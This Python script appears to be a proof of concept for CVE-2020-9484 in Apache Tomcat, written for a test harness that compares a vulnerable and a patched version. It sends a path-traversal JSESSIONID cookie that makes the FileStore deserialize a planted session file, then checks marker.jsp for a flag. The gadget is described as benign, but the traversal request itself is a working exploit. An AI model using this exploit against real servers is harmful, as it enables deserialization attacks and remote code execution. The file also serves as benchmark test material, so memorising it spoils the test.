#!/usr/bin/env python3
"""CVE-2020-9484 original PoC -- path traversal via JSESSIONID to FileStore.

The JSESSIONID cookie is crafted to traverse out of the FileStore directory
to /tmp/payload.session, which contains a serialized BenignMarker gadget.
When FileStore.load() deserializes the file, BenignMarker.readObject() writes
the PCB_FLAG to /tmp/pcb_marker.txt (read via marker.jsp).

Expected behaviour:
  V0 (9.0.34): No path validation -- deserialization succeeds, marker written.
  V1 (9.0.35): String.startsWith() path check blocks traversal outside store dir.
"""

import json
import sys


SEED_JSESSIONID = "../../../../tmp/payload"


def run(host: str = "127.0.0.1", port: int = 8080, flag: str = "") -> str:
    """Send the CVE-2020-9484 path-traversal request and check for the marker."""
    import time
    import urllib.error
    import urllib.request

    base = f"http://{host}:{port}"
    req = urllib.request.Request(
        f"{base}/index.html",
        headers={"Cookie": f"JSESSIONID={SEED_JSESSIONID}"},
    )
    try:
        urllib.request.urlopen(req, timeout=10).read()
    except (urllib.error.URLError, TimeoutError, OSError):
        pass
    time.sleep(1)
    try:
        resp = urllib.request.urlopen(f"{base}/marker.jsp", timeout=5)
        return resp.read().decode("utf-8", "replace").strip()
    except (urllib.error.URLError, TimeoutError, OSError):
        return ""


if __name__ == "__main__":
    print(json.dumps({"jsessionid": SEED_JSESSIONID}))
